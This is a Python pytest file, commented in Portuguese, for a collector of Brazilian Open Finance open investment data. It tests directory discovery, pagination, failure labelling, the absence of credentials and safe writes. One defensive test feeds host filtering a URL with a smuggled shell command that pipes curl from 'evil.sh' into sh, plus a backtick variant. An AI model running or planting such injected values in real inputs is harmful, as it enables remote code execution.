# -*- coding: utf-8 -*-
"""O coletor de dados abertos: descobre certo, pagina certo e não inventa nada.

O teste não toca a rede. Ele injeta uma função de abertura falsa, o que também
serve de contrato: se alguém trocar urllib por outra biblioteca sem manter o
ponto de injeção, o teste quebra antes de o programa sair chamando trezentos
hosts de terceiros às cegas.

O que importa aqui não é o número de nenhuma instituição. É a disciplina em
volta dele: descoberta pelo caminho da especificação e não por um nome de
família suposto, paginação que não repete a primeira página vinte vezes, host
fora do ar que não derruba os outros, e nenhuma credencial em lugar nenhum.
"""
from __future__ import annotations

from pathlib import Path
import io
import json
import sys
import urllib.error

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "tools"))

import build_open_finance_investments as coletor  # noqa: E402

BASE = "https://api.bancoexemplo.com.br/open-banking/opendata-investments/v1"


class RespostaFalsa(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *_):
        return False


def diretorio(*organizacoes) -> list:
    return list(organizacoes)


def organizacao(nome, cnpj, *enderecos, status="Active"):
    return {
        "OrganisationName": nome,
        "RegistrationNumber": cnpj,
        "Status": status,
        "AuthorisationServers": [{
            "CustomerFriendlyName": nome,
            "ApiResources": [{
                "ApiFamilyType": "opendata-investments",
                "ApiVersion": "1.0.1",
                "ApiDiscoveryEndpoints": [{"ApiEndpoint": e} for e in enderecos],
            }],
        }],
    }


def _abrir(mapa, vistos=None):
    """Responde pelo trecho do endereço pedido, e anota o que foi pedido."""
    def abrir(pedido, timeout=None):
        alvo = pedido.full_url
        if vistos is not None:
            vistos.append(pedido)
        for pedaco, corpo in mapa.items():
            if pedaco in alvo:
                if isinstance(corpo, Exception):
                    raise corpo
                return RespostaFalsa(json.dumps(corpo).encode("utf-8"))
        raise AssertionError(f"pedido inesperado: {alvo}")
    return abrir


def pagina(itens, total_paginas=1) -> dict:
    return {"data": itens, "links": {}, "meta": {"totalRecords": len(itens),
                                                 "totalPages": total_paginas}}


# --- descoberta -------------------------------------------------------------

def test_a_base_sai_do_caminho_e_nao_do_nome_da_familia() -> None:
    """As duas formas do diretório viram a mesma base, e o resto não vira nada."""
    assert coletor.base_do_endpoint(BASE) == BASE
    assert coletor.base_do_endpoint(f"{BASE}/bank-fixed-incomes") == BASE
    assert coletor.base_do_endpoint(
        "https://api.b.com.br/open-banking/opendata-loans/v1/personal-loans") is None
    assert coletor.base_do_endpoint("nem-url") is None


def test_o_mesmo_participante_nao_entra_uma_vez_por_recurso_publicado() -> None:
    lista = coletor.bases_publicadas(diretorio(organizacao(
        "Banco Exemplo", "45086338000178",
        f"{BASE}/funds", f"{BASE}/bank-fixed-incomes", f"{BASE}/treasure-titles")))
    assert [p["base"] for p in lista] == [BASE]
    assert lista[0]["cnpj"] == "45086338000178"


def test_participante_inativo_fica_de_fora() -> None:
    lista = coletor.bases_publicadas(diretorio(
        organizacao("Banco Ativo", "45086338000178", BASE),
        organizacao("Banco Fora", "11111111000191",
                    "https://api.fora.com.br/open-banking/opendata-investments/v1",
                    status="Inactive")))
    assert [p["organizacao"] for p in lista] == ["Banco Ativo"]


def test_quem_nao_publica_investimentos_nao_aparece() -> None:
    """O diretório inteiro passa por aqui; só o caminho da especificação entra."""
    outra_familia = {
        "OrganisationName": "Banco Só de Empréstimo",
        "RegistrationNumber": "22222222000191",
        "Status": "Active",
        "AuthorisationServers": [{"ApiResources": [{
            "ApiFamilyType": "opendata-loans",
            "ApiDiscoveryEndpoints": [
                {"ApiEndpoint": "https://api.x.com.br/open-banking/opendata-loans/v1"}],
        }]}],
    }
    assert coletor.bases_publicadas(diretorio(outra_familia)) == []


def test_o_filtro_de_nome_vale_nos_dois_modos() -> None:
    """Listar reimplementava a seleção, e esqueceu o filtro.

    Pedir uma instituição pelo nome devolvia a lista inteira, sem erro nenhum:
    quem lê acha que aquele é o resultado da busca. Os dois caminhos passam pela
    mesma função agora, e este teste é o que impede a cópia de voltar.
    """
    lista = coletor.bases_publicadas(diretorio(
        organizacao("Banco Exemplo", "45086338000178", BASE),
        organizacao("Outro Banco", "11111111000191",
                    "https://api.outro.com.br/open-banking/opendata-investments/v1")))
    assert len(lista) == 2
    assert [p["organizacao"] for p in coletor.filtrados(lista, "outro", None)] == ["Outro Banco"]
    assert [p["organizacao"] for p in coletor.filtrados(lista, "", 1)] == ["Banco Exemplo"]
    assert coletor.filtrados(lista, "nao existe", None) == []
    assert coletor.filtrados(lista, "", None) == lista


def test_a_marca_tambem_casa_no_filtro() -> None:
    """O diretório separa razão social de nome de fantasia, e quem busca usa o
    segundo: filtrar só pela organização acharia menos do que existe."""
    lista = coletor.bases_publicadas(diretorio(
        organizacao("Instituicao de Pagamento XYZ Ltda", "45086338000178", BASE)))
    lista[0]["marca"] = "Apelido"
    assert coletor.filtrados(lista, "apelido", None) == lista


def test_o_host_so_sai_da_lista_se_tiver_forma_de_host() -> None:
    """A lista alimenta um laço de shell, e o diretório é de terceiros.

    Filtrar na origem em vez de escapar no destino é deliberado: o destino pode
    mudar de dono — hoje é um `while read` no workflow, amanhã é outra coisa —
    e o escape não viaja junto com o dado. O filtro, sim.
    """
    lista = [{"base": "https://api.bom.com.br/open-banking/opendata-investments/v1"},
             {"base": "https://mau; curl evil.sh | sh/open-banking/opendata-investments/v1"},
             {"base": "https://tambem`mau`/open-banking/opendata-investments/v1"},
             {"base": "https://api.bom.com.br/outro/opendata-investments/v1"}]
    assert coletor.hosts(lista) == ["api.bom.com.br"]


def test_a_lista_de_hosts_nao_repete_e_guarda_a_ordem() -> None:
    """Um host por linha, e cada um uma vez: dois endereços da mesma marca
    apresentam o mesmo certificado, e diagnosticar duas vezes é gastar duas."""
    lista = [{"base": "https://b.com.br/open-banking/opendata-investments/v1"},
             {"base": "https://a.com.br/open-banking/opendata-investments/v1"},
             {"base": "https://b.com.br/x/open-banking/opendata-investments/v1"}]
    assert coletor.hosts(lista) == ["b.com.br", "a.com.br"]


def test_sem_ancora_extra_o_abridor_e_o_de_sempre() -> None:
    """A âncora é opcional: sem ela o coletor usa as do sistema e os hosts que
    não validam continuam falhando, nomeados. Falhar visível é melhor que
    passar, e é por isso que o padrão não muda."""
    import urllib.request
    assert coletor.abridor_com("") is urllib.request.urlopen
    assert coletor.abridor_com(None) is urllib.request.urlopen


def test_ancora_ilegivel_levanta_em_vez_de_cair_no_padrao(tmp_path) -> None:
    """Cair no padrão em silêncio é o defeito perigoso aqui.

    O coletor pareceria consertado e continuaria recusando os mesmos oito
    hosts, e quem fosse investigar procuraria o defeito no lugar errado — no
    certificado do banco, não no arquivo que não carregou.
    """
    with pytest.raises(FileNotFoundError):
        coletor.abridor_com(str(tmp_path / "nao-existe.pem"))

    qualquer_coisa = tmp_path / "isto-nao-e-pem.txt"
    qualquer_coisa.write_text("bom dia", encoding="utf-8")
    with pytest.raises(Exception) as caiu:
        coletor.abridor_com(str(qualquer_coisa))
    assert not isinstance(caiu.value, AssertionError)


# --- paginação --------------------------------------------------------------

def test_a_paginacao_para_no_total_declarado_pelo_envelope() -> None:
    corpos = [pagina([{"n": i} for i in range(coletor.POR_PAGINA)], total_paginas=2),
              pagina([{"n": "ultimo"}], total_paginas=2)]
    chamadas = []

    def abrir(pedido, timeout=None):
        chamadas.append(pedido.full_url)
        return RespostaFalsa(json.dumps(corpos[len(chamadas) - 1]).encode("utf-8"))

    itens = coletor.buscar_recurso(BASE, "funds", abrir=abrir)
    assert len(itens) == coletor.POR_PAGINA + 1
    assert len(chamadas) == 2
    assert "page=1" in chamadas[0] and f"page-size={coletor.POR_PAGINA}" in chamadas[0]


def test_host_que_ignora_a_pagina_nao_vira_vinte_copias() -> None:
    """Resultado grande e errado é pior que erro: mil linhas parecem resultado."""
    cheia = pagina([{"n": i} for i in range(coletor.POR_PAGINA)], total_paginas=99)
    itens = coletor.buscar_recurso(BASE, "funds", abrir=_abrir({BASE: cheia}))
    assert len(itens) == coletor.POR_PAGINA


def test_paginacao_que_nao_converge_falha_alto() -> None:
    contador = {"n": 0}

    def abrir(pedido, timeout=None):
        contador["n"] += 1
        corpo = pagina([{"n": contador["n"]}] * coletor.POR_PAGINA, total_paginas=99)
        return RespostaFalsa(json.dumps(corpo).encode("utf-8"))

    with pytest.raises(coletor.RecursoIndisponivel):
        coletor.buscar_recurso(BASE, "funds", abrir=abrir)


# --- robustez e contrato ----------------------------------------------------

def test_um_host_fora_do_ar_nao_derruba_os_outros() -> None:
    fora = "https://api.caiu.com.br/open-banking/opendata-investments/v1"

    def abrir(pedido, timeout=None):
        if fora in pedido.full_url:
            raise urllib.error.HTTPError(pedido.full_url, 429, "Too Many Requests",
                                         {}, io.BytesIO(b""))
        return RespostaFalsa(json.dumps(pagina([{"ok": True}])).encode("utf-8"))

    documento = coletor.coletar(
        abrir=abrir, pausa=0,
        diretorio=diretorio(organizacao("Banco Bom", "45086338000178", BASE),
                            organizacao("Banco Caiu", "11111111000191", fora)))
    bons = [p for p in documento["participantes"] if p["organizacao"] == "Banco Bom"]
    assert bons[0]["recursos"]["funds"]["linhas"] == 1
    assert len(documento["falhas"]) == len(coletor.RECURSOS)
    assert "HTTP 429" in documento["falhas"][0]


def test_quem_responde_404_nao_entra_na_conta_de_falhas() -> None:
    """Ausência declarada é resposta, e somá-la a falha mente sobre o mercado.

    Uma instituição que não distribui Tesouro responde 404 em treasure-titles.
    Contar isso junto com um handshake de TLS que falhou produz um número que
    faz o ecossistema parecer quebrado quando metade daquilo é a instituição
    dizendo, corretamente, o que ela não tem.
    """
    def abrir(pedido, timeout=None):
        if "treasure-titles" in pedido.full_url:
            raise urllib.error.HTTPError(pedido.full_url, 404, "Not Found", {},
                                         io.BytesIO(b""))
        return RespostaFalsa(json.dumps(pagina([{"ok": True}])).encode("utf-8"))

    documento = coletor.coletar(
        abrir=abrir, pausa=0,
        diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))
    assert documento["falhas"] == []
    assert documento["ausencias"] == ["Banco Exemplo/treasure-titles"]
    recurso = documento["participantes"][0]["recursos"]["treasure-titles"]
    assert recurso["linhas"] == 0 and "não publica" in recurso["ausente"]
    assert "falhou" not in recurso


def test_erro_de_servidor_continua_sendo_falha() -> None:
    """Só o 404 vira ausência. Um 503 é o host quebrado, e isso é falha."""
    def abrir(pedido, timeout=None):
        raise urllib.error.HTTPError(pedido.full_url, 503, "Service Unavailable",
                                     {}, io.BytesIO(b""))

    documento = coletor.coletar(
        abrir=abrir, pausa=0,
        diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))
    assert documento["ausencias"] == []
    assert len(documento["falhas"]) == len(coletor.RECURSOS)
    assert documento["falhas_por_causa"] == {"HTTP 5xx": len(coletor.RECURSOS)}


def test_as_falhas_sao_agrupadas_por_causa() -> None:
    """Cento e sete falhas é um número; rotuladas, viram um diagnóstico.

    A diferença decide o que fazer: certificado fora do bundle padrão se resolve
    acrescentando a cadeia, host que não resolve se resolve com a instituição
    corrigindo o cadastro no diretório, e 5xx se resolve esperando.
    """
    contagem = coletor.contar_por_causa([
        "A/funds: rede: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed",
        "B/funds: rede: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed",
        "C/funds: rede: [Errno -2] Name or service not known",
        "D/funds: HTTP 503",
        "E/funds: rede: timed out",
    ])
    assert list(contagem) == ["TLS: certificado não confiável", "DNS: host não resolve",
                              "HTTP 5xx", "tempo esgotado"]
    assert contagem["TLS: certificado não confiável"] == 2
    # Da mais frequente para a menos: quem lê quer saber onde está o problema.
    assert list(contagem.values()) == sorted(contagem.values(), reverse=True)


def test_um_erro_de_tls_nao_e_rotulado_como_rede_generica() -> None:
    """Certificado chega dentro de um URLError e o rótulo genérico o engoliria,
    que é justamente a causa que precisa aparecer separada."""
    assert coletor.rotulo_da_falha(
        "rede: [SSL: CERTIFICATE_VERIFY_FAILED] self-signed certificate"
    ) == "TLS: certificado não confiável"
    assert coletor.rotulo_da_falha("rede: conexão recusada") == "rede: outro erro"


def test_resposta_que_nao_e_json_e_falha_nomeada_e_nao_traceback() -> None:
    def abrir(pedido, timeout=None):
        return RespostaFalsa(b"<html>portal do banco</html>")

    with pytest.raises(coletor.RecursoIndisponivel) as caiu:
        coletor.buscar_recurso(BASE, "funds", abrir=abrir)
    assert "não é JSON" in str(caiu.value)


def test_nenhuma_chamada_leva_cabecalho_de_autorizacao() -> None:
    """O contrato do módulo: dados abertos não têm esquema de segurança.

    Se um dia alguém acrescentar um cabeçalho aqui, é porque passou a chamar a
    API de dados de clientes — e essa exige ser participante autorizado, o que
    este projeto não é. O teste é o lugar onde isso para.
    """
    vistos = []
    coletor.coletar(abrir=_abrir({BASE: pagina([{"ok": True}])}, vistos), pausa=0,
                    diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))
    assert vistos
    for pedido in vistos:
        assert pedido.get_header("Authorization") is None
        assert pedido.get_header("Access_token") is None
        assert pedido.get_method() == "GET"


def test_o_documento_diz_que_a_data_e_a_da_coleta_e_nao_a_da_apuracao() -> None:
    """A API não devolve período de referência em campo nenhum.

    Sem esse aviso escrito no arquivo, quem lê daqui a um ano supõe que a
    distribuição é do mês em que ele está lendo.
    """
    documento = coletor.coletar(
        abrir=_abrir({BASE: pagina([{"ok": True}])}), pausa=0,
        diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))
    assert documento["colhido_em"].endswith("+00:00")
    assert "não tem campo de período de referência" in documento["aviso_de_data"]
    assert "não oferta comprável" in documento["aviso_de_uso"]
    assert documento["origem"] == "AUTOMATICA_PUBLICA"


def test_a_impressao_do_conteudo_muda_quando_o_conteudo_muda() -> None:
    """Sem hash, uma coleta seguinte alega que mudou; com hash, prova."""
    def documento_com(linhas):
        return coletor.coletar(
            abrir=_abrir({BASE: pagina(linhas)}), pausa=0,
            diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))

    antes = documento_com([{"taxa": "1.020000"}])
    depois = documento_com([{"taxa": "1.030000"}])
    assert (antes["participantes"][0]["recursos"]["funds"]["sha256"]
            != depois["participantes"][0]["recursos"]["funds"]["sha256"])


def test_coleta_vazia_nao_apaga_coleta_boa(tmp_path) -> None:
    destino = tmp_path / "dados_abertos_open_finance.json"
    cheio = coletor.coletar(
        abrir=_abrir({BASE: pagina([{"ok": True}])}), pausa=0,
        diretorio=diretorio(organizacao("Banco Exemplo", "45086338000178", BASE)))
    coletor.gravar(destino, cheio)

    vazio = coletor.coletar(abrir=_abrir({}), pausa=0, diretorio=[])
    with pytest.raises(SystemExit) as parou:
        coletor.gravar(destino, vazio)
    assert "fica como está" in str(parou.value)
    assert json.loads(destino.read_text(encoding="utf-8"))["participantes"]


def test_o_nome_publicado_sai_da_data_de_dentro_do_arquivo() -> None:
    """O nome e o ``colhido_em`` não podem divergir, então o nome vem de dentro."""
    caminho = coletor.destino_datado("2026-09-17T02:47:24+00:00", Path("/tmp"))
    assert caminho.name == "dados_abertos_open_finance_2026-09-17.json"


@pytest.mark.parametrize("colhido_em", ["", "ontem", "2026/09/17", "17-09-2026"])
def test_data_que_nao_e_iso_levanta_em_vez_de_virar_nome(colhido_em) -> None:
    """Nome com data inventada é pior que nenhum: ele parece um dado datado."""
    with pytest.raises(ValueError, match="colhido_em"):
        coletor.destino_datado(colhido_em, Path("/tmp"))


def test_publicar_colhe_so_o_que_alguem_le(tmp_path, monkeypatch) -> None:
    """``--publicar`` corta os recursos que nenhum consumidor abre.

    Sem o corte, cada publicação versiona vinte mil linhas de distribuição de
    taxa de emissão que nenhuma linha deste repositório lê.
    """
    mapa = {f"/{recurso}?": pagina([{"cnpjNumber": "73232530000139",
                                     "name": f"linha de {recurso}"}])
            for recurso in coletor.RECURSOS}
    destino = tmp_path / "dados_abertos_open_finance.json"
    monkeypatch.setattr(coletor, "DESTINO", destino)
    monkeypatch.setattr(coletor, "abridor_com", lambda _: _abrir(mapa))
    monkeypatch.setattr(sys, "argv", [
        "coletor", "--publicar", "--pausa", "0",
        "--diretorio-local", str(_diretorio_salvo(tmp_path))])

    coletor.main()

    assert not destino.exists(), "publicar não pode escrever no caminho mutável"
    (publicado,) = tmp_path.glob("dados_abertos_open_finance_*.json")
    escrito = json.loads(publicado.read_text(encoding="utf-8"))
    recursos = escrito["participantes"][0]["recursos"]
    assert tuple(recursos) == coletor.RECURSOS_PUBLICADOS
    assert "bank-fixed-incomes" not in recursos
    assert publicado.name[-15:-5] == escrito["colhido_em"][:10]


def test_saida_explicita_manda_mesmo_com_publicar(tmp_path, monkeypatch) -> None:
    """Quem escolheu o caminho está dizendo onde quer; datar por cima seria
    gravar em outro lugar sem avisar."""
    mapa = {"/funds?": pagina([{"cnpjNumber": "73232530000139", "name": "um fundo"}])}
    escolhido = tmp_path / "onde-eu-quis.json"
    monkeypatch.setattr(coletor, "DESTINO", tmp_path / "dados_abertos_open_finance.json")
    monkeypatch.setattr(coletor, "abridor_com", lambda _: _abrir(mapa))
    monkeypatch.setattr(sys, "argv", [
        "coletor", "--publicar", "--pausa", "0", "--saida", str(escolhido),
        "--diretorio-local", str(_diretorio_salvo(tmp_path))])

    coletor.main()

    assert escolhido.exists()
    assert not list(tmp_path.glob("dados_abertos_open_finance_*.json"))


def _diretorio_salvo(tmp_path: Path) -> Path:
    caminho = tmp_path / "diretorio.json"
    caminho.write_text(json.dumps(diretorio(
        organizacao("Banco Exemplo", "45086338000178", BASE))), encoding="utf-8")
    return caminho
